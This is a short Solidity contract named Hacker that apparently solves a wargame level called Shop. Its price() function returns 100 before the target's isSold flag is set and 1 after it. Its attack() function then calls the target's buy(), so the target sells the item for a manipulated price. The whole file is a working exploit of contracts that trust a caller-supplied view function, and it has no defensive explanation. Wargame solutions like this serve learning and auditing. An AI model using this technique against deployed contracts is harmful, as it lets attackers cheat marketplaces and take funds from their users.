// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

abstract contract IShop {
  uint256 public price = 100;
  bool public isSold;

  function buy() public virtual;
}

contract Hacker {
  address public hacker;
  IShop shop;

  modifier onlyHacker {
    require(msg.sender == hacker, "caller is not the hacker");
    _;
  }

  constructor() public {
    hacker = msg.sender;
  }

  /**
   * @dev If the item is sold, returns hacked number, otherwise return larger price than asked.
   */
  function price() external view returns (uint256) {
    return shop.isSold() ? 1 : 100;
  }

  // Trigger a shopping
  function attack(address _target) public onlyHacker {
    shop = IShop(_target);
    shop.buy();
  }
}
